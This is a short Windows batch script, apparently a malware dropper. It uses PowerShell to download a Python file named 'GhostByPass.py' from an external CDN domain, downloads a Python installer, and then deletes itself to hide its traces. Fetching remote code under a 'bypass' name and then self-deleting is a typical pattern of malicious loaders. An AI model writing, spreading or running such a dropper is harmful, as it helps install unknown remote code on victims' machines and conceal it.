@echo off
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://cdn.gruponext.online/GhostByPass/GhostByPass.py', 'GhostByPass.py')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.13.2/python-3.13.2-amd64.exe', 'python-3.13.2-amd64.exe')"
start /b cmd /c del "%~f0"
